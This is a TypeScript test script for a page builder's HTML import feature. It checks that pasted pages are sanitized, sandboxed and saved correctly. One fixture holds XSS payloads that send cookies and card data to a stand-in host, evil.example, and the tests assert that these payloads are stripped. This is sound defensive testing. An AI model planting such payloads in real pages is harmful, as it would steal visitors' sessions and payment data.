/**
 * Pages & Funnels — Import HTML (2026-11-20): AI-generated full pages become
 * ONE Custom HTML block (same sanitizer / sandboxed frame / CSP as that
 * block). Pure fixtures + Firestore EMULATOR persistence (create, save,
 * publish, duplicate, versions). No network, no production credentials.
 *
 * Run (from the repo root):
 *   echo '{"emulators":{"firestore":{"port":8094},"auth":{"port":9194}}}' > firebase.html-import-test.json
 *   firebase emulators:exec --config firebase.html-import-test.json --only firestore,auth --project demo-html-import \
 *     "NODE_OPTIONS='--require ./scripts/_server-only-shim.cjs' pnpm exec tsx --tsconfig ./tsconfig.json scripts/check-html-import.ts"
 */
import assert from "node:assert/strict";
import { initializeApp } from "firebase-admin/app";

const PROJECT = process.env.GCLOUD_PROJECT ?? "";
if (!process.env.FIRESTORE_EMULATOR_HOST || !PROJECT.startsWith("demo-") || process.env.FIREBASE_ADMIN_PRIVATE_KEY || process.env.GOOGLE_APPLICATION_CREDENTIALS) {
  console.error("Refusing to run: Firestore emulator + demo-* project only, no production credentials.");
  process.exit(1);
}
process.env.FIREBASE_ADMIN_PROJECT_ID ??= PROJECT;
for (const k of ["RESEND_API_KEY", "QSTASH_TOKEN", "QSTASH_URL", "STRIPE_SECRET_KEY"]) delete process.env[k];

let passed = 0;
let failed = 0;
async function check(name: string, fn: () => Promise<void> | void) {
  try {
    await fn();
    passed++;
    console.log(`  ok  ${name}`);
  } catch (err) {
    failed++;
    console.log(`  FAIL ${name}\n       ${(err as Error).stack?.split("\n").slice(0, 3).join("\n       ")}`);
  }
}

const LANDING = `<!DOCTYPE html>
<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bright Path Coaching</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
<style>
  :root { --brand: #5b2a86; }
  body { font-family: 'Inter', sans-serif; margin: 0; }
  .hero { min-height: 100vh; display: grid; place-items: center; background: linear-gradient(135deg, #5b2a86, #e85d75); color: #fff; }
  .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 24px; }
  @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } .nav-links { display: none; } }
</style></head>
<body>
  <nav><a href="#top">Bright Path</a><div class="nav-links"><a href="#features">Features</a><a href="#pricing">Pricing</a></div></nav>
  <section class="hero" id="top"><h1>Launch with clarity</h1><a class="cta" href="https://crm.example.com/checkout/abc">Join now</a></section>
  <section id="features" class="grid"><div>One</div><div>Two</div><div>Three</div></section>
  <img src="https://images.example.com/hero.jpg" alt="Coach">
  <section id="pricing"><button onclick="alert(1)">Buy</button></section>
  <script>document.querySelector('.cta').addEventListener('click', () => {});</script>
</body></html>`;

const BROKEN_ASSETS = `<html><head><link rel="stylesheet" href="styles.css"><script src="app.js"></script></head>
<body><img src="images/hero.png"><img src="http://insecure.example.com/a.png"><div style="background:url('img/bg.jpg')"></div>
<a href="about.html">About</a><a href="mailto:hi@example.com">Email</a><a href="#faq">FAQ</a><a href="https://example.com">Site</a></body></html>`;

const MALICIOUS = `<html><body>
<h1>Hi</h1>
<img src=x onerror="fetch('https://evil.example/'+document.cookie)">
<a href="javascript:alert(document.cookie)">click</a>
<iframe src="https://evil.example"></iframe>
<object data="x.swf"></object>
<base href="https://evil.example/">
<meta http-equiv="refresh" content="0;url=https://evil.example">
<form action="https://evil.example/steal" method="post"><input name="card"><button>Pay</button></form>
<div style="background:url(javascript:alert(1))">x</div>
<svg><script>alert(1)</script></svg>
</body></html>`;

async function main() {
  const imp = await import("../src/lib/pages-funnels/custom-html/import");
  const policy = await import("../src/lib/pages-funnels/custom-html/policy");
  const san = await import("../src/lib/pages-funnels/custom-html/sanitize");

  console.log("A. Import analysis (pure)");
  await check("a typical AI landing page: body + all CSS kept, fonts link → @import, document wrapper dropped", () => {
    const a = imp.analyzeHtmlImport(LANDING);
    assert.deepEqual(a.problems, []);
    assert.equal(a.artifact.source?.kind, "pasted-document");
    assert.match(a.artifact.html, /<section class="hero" id="top">/);
    assert.match(a.artifact.html, /id="features"/);
    assert.match(a.artifact.css, /@media \(max-width: 768px\)/);
    assert.match(a.artifact.css, /linear-gradient/);
    assert.match(a.artifact.css, /@import url\("https:\/\/fonts\.googleapis\.com/);
    assert.ok(!/<html|<head|<title|<!doctype/i.test(a.artifact.html));
    assert.equal(a.artifact.display.height, "auto");
    assert.deepEqual(a.missingFiles, []);
    assert.deepEqual(a.siteLinks, []);
  });
  await check("scripts and inline handlers removed and REPORTED; anchors kept; external links open the page, not the frame", () => {
    const a = imp.analyzeHtmlImport(LANDING);
    assert.ok(!/<script|onclick/i.test(a.artifact.html));
    assert.ok(a.notes.some((n) => /script/i.test(n)), a.notes.join(" | "));
    assert.match(a.artifact.html, /href="#features"/);
    assert.ok(!/href="#features"[^>]*target=/.test(a.artifact.html), "anchor links stay in the page");
    assert.match(a.artifact.html, /href="https:\/\/crm\.example\.com\/checkout\/abc"[^>]*target="_top"|target="_top"[^>]*href="https:\/\/crm\.example\.com\/checkout\/abc"/);
  });
  await check("missing files are listed (relative images, stylesheet, script, CSS url(), insecure http); site links listed separately", () => {
    const a = imp.analyzeHtmlImport(BROKEN_ASSETS);
    for (const f of ["styles.css", "app.js", "images/hero.png", "http://insecure.example.com/a.png", "img/bg.jpg"]) assert.ok(a.missingFiles.includes(f), `${f} in ${JSON.stringify(a.missingFiles)}`);
    assert.deepEqual(a.siteLinks, ["about.html"]);
    assert.deepEqual(a.problems, [], "missing files warn, they don't block");
  });
  await check("malicious markup: no script, handler, javascript: URL, frame, object, base, meta refresh survives; forms can't submit", () => {
    const a = imp.analyzeHtmlImport(MALICIOUS);
    const h = a.artifact.html.toLowerCase();
    for (const bad of ["<script", "onerror", "javascript:", "<iframe", "<object", "<base", "http-equiv", "document.cookie"]) assert.ok(!h.includes(bad), `${bad} removed`);
    const doc = san.buildSafeCustomHtmlDocument(a.artifact);
    assert.ok(!/javascript:/i.test(doc.srcDoc.replace(/<script[^>]*>[\s\S]*?<\/script>/g, "")));
    assert.match(doc.srcDoc, /form-action 'none'/, "CSP blocks form submission");
    assert.ok(!policy.customHtmlSandbox("visitor").includes("allow-same-origin"), "opaque origin: no cookies / session / parent DOM");
    assert.ok(!policy.customHtmlSandbox("visitor").includes("allow-forms"));
    assert.ok(a.notes.some((n) => /form/i.test(n)), a.notes.join(" | "));
  });
  await check("the only script in the frame is Magnetix's own height measurer, pinned by hash in the CSP", () => {
    const doc = san.buildSafeCustomHtmlDocument(imp.analyzeHtmlImport(LANDING).artifact);
    const scripts = doc.srcDoc.match(/<script\b/gi) ?? [];
    assert.equal(scripts.length, 1);
    assert.match(doc.srcDoc, /script-src 'sha256-/);
  });
  await check("empty / not-HTML / too large are refused with a plain reason", () => {
    assert.match(imp.analyzeHtmlImport("   ").problems.join(" "), /Paste the page's HTML/);
    assert.match(imp.analyzeHtmlImport("just some words").problems.join(" "), /doesn't look like HTML/);
    const big = `<html><body>${"<p>" + "x".repeat(300) + "</p>".repeat(1)}${"<div>filler text</div>".repeat(16000)}</body></html>`;
    assert.ok(imp.analyzeHtmlImport(big).problems.length > 0);
  });
  await check("an HTML fragment (no document wrapper) imports too", () => {
    const a = imp.analyzeHtmlImport(`<style>.x{color:red}</style><div class="x">Hello</div>`);
    assert.deepEqual(a.problems, []);
    assert.match(a.artifact.html, /class="x"/);
    assert.match(a.artifact.css, /color:red|color: red/);
  });

  console.log("B. Persistence (emulator)");
  initializeApp({ projectId: PROJECT });
  const { getAdminDb } = await import("../src/lib/firebase/admin");
  const puck = await import("../src/lib/server/pages-funnels-puck-service");
  const storage = await import("../src/lib/pages-funnels/puck-storage");
  const versions = await import("../src/lib/server/pages-funnels/page-version-service");
  const db = getAdminDb();
  const SA = "sa_html";
  await db.doc(`subAccounts/${SA}`).set({ name: "HTML QA", agencyId: "ag_html", createdByUid: "u1" });
  let pageId = "";
  const draftOf = async (id: string) => storage.readStoredPuckData((await db.doc(`pages/${id}`).get()).get("puckDraftData"))!;

  await check("Import HTML creates ONE draft page holding one Custom HTML block (server re-analyzes the HTML)", async () => {
    const r = await puck.createPuckPage({ subAccountId: SA, uid: "u1", name: "Bright Path", pageType: "landing", goal: "lead_generation", importHtml: LANDING });
    assert.ok(r.ok);
    pageId = (r as { pageId: string }).pageId;
    const doc = (await db.doc(`pages/${pageId}`).get()).data()!;
    assert.equal(doc.status, "draft");
    assert.equal(doc.subAccountId, SA);
    const data = await draftOf(pageId);
    assert.equal(data.content.length, 1);
    const section = data.content[0] as { type: string; props: { maxWidth: string; paddingTop: number; paddingBottom: number; rows: { props: { columns: { props: { elements: { type: string; props: { content: { html: string; css: string } } }[] } }[] } }[] } };
    assert.equal(section.type, "Section");
    assert.equal(section.props.maxWidth, "bleed", "edge to edge, as designed");
    assert.equal(section.props.paddingTop, 0);
    const blocks = section.props.rows[0].props.columns[0].props.elements;
    assert.equal(blocks.length, 1);
    assert.equal(blocks[0].type, "CustomHtml");
    const art = blocks[0].props.content;
    assert.ok(!/<script/i.test(art.html), "sanitized on the server");
    assert.match(art.css, /@media/);
  });
  await check("bad import refused on the server; nothing created", async () => {
    const before = (await db.collection("pages").where("subAccountId", "==", SA).get()).size;
    const r = await puck.createPuckPage({ subAccountId: SA, uid: "u1", name: "Nope", pageType: "landing", goal: "lead_generation", importHtml: "not html" });
    assert.equal(r.ok, false);
    assert.equal((await db.collection("pages").where("subAccountId", "==", SA).get()).size, before);
    const rr = await puck.createPuckPage({ subAccountId: SA, uid: "u1", name: "Reading", pageType: "reading_result", goal: "confirmation", importHtml: LANDING });
    assert.equal(rr.ok, false);
  });
  await check("edit the HTML source and save the draft; publish; the live copy is the imported design", async () => {
    const data = await draftOf(pageId);
    const block = (data.content[0] as { props: { rows: { props: { columns: { props: { elements: { props: { content: { html: string } } }[] } }[] } }[] } }).props.rows[0].props.columns[0].props.elements[0];
    block.props.content.html = block.props.content.html.replace("Launch with clarity", "Launch with total clarity");
    const saved = await puck.savePuckDraft(SA, pageId, data, {}, { actor: { uid: "u1", name: "QA" } });
    assert.ok(saved.ok, JSON.stringify(saved));
    const pub = await puck.publishPuckPage(SA, pageId, await draftOf(pageId), {}, { actor: { uid: "u1", name: "QA" } });
    assert.ok(pub.ok, JSON.stringify(pub));
    const live = storage.readStoredPuckData((await db.doc(`pages/${pageId}`).get()).get("puckPublishedData"))!;
    assert.match(JSON.stringify(live), /Launch with total clarity/);
    assert.equal((await db.doc(`pages/${pageId}`).get()).get("status"), "published");
  });
  await check("version history keeps the imported design; duplicate is an independent draft copy", async () => {
    const list = await versions.listPageVersions(SA, pageId);
    assert.ok(list.ok && list.versions.length >= 1);
    const dup = await puck.duplicatePuckPage(SA, pageId, "u1");
    assert.ok(dup.ok);
    const copy = (await db.doc(`pages/${(dup as { pageId: string }).pageId}`).get()).data()!;
    assert.equal(copy.status, "draft");
    assert.match(JSON.stringify(await draftOf((dup as { pageId: string }).pageId)), /Launch with total clarity/);
  });
  await check("another workspace can't read or edit the imported page", async () => {
    const r = await puck.savePuckDraft("sa_other", pageId, await draftOf(pageId), {}, {});
    assert.equal(r.ok, false);
  });

  console.log(`\n${passed} passed, ${failed} failed`);
  process.exit(failed ? 1 : 0);
}
main().catch((e) => {
  console.error(e);
  process.exit(1);
});
